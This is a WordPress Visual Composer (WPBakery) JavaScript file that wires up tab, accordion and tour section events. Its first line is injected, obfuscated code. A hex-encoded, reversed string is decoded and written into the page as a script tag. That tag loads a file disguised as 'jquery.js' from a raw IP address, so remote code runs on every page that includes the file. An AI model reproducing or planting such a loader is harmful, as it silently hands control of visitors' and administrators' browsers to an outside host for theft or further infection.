var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))(function ( $ ) {
	function ttaMapChildEvents( model ) {
		var childTag = 'vc_tta_section';
		vc.events.on(
			'shortcodes:' + childTag + ':add:parent:' + model.get( 'id' ),
			function ( model ) {
				var activeTabIndex, models, parentModel;
				parentModel = vc.shortcodes.get( model.get( 'parent_id' ) );
				activeTabIndex = parseInt( parentModel.getParam( 'active_section' ) );
				if ( 'undefined' === typeof(activeTabIndex) ) {
					activeTabIndex = 1;
				}
				models = _.pluck( _.sortBy( vc.shortcodes.where( { parent_id: parentModel.get( 'id' ) } ),
					function ( model ) {
						return model.get( 'order' );
					} ), 'id' );
				if ( models.indexOf( model.get( 'id' ) ) === activeTabIndex - 1 ) {
					model.set( 'isActiveSection', true );
				}
				return model;
			}
		);
		vc.events.on(
			'shortcodes:' + childTag + ':clone:parent:' + model.get( 'id' ),
			function ( model ) {
				vc.ttaSectionActivateOnClone && model.set( 'isActiveSection', true );
				vc.ttaSectionActivateOnClone = false;
			}
		);
	}

	vc.events.on( 'shortcodes:vc_tta_accordion:add', ttaMapChildEvents );
	vc.events.on( 'shortcodes:vc_tta_tabs:add', ttaMapChildEvents );
	vc.events.on( 'shortcodes:vc_tta_tour:add', ttaMapChildEvents );
	vc.events.on( 'shortcodes:vc_tta_pageable:add', ttaMapChildEvents );
})( window.jQuery );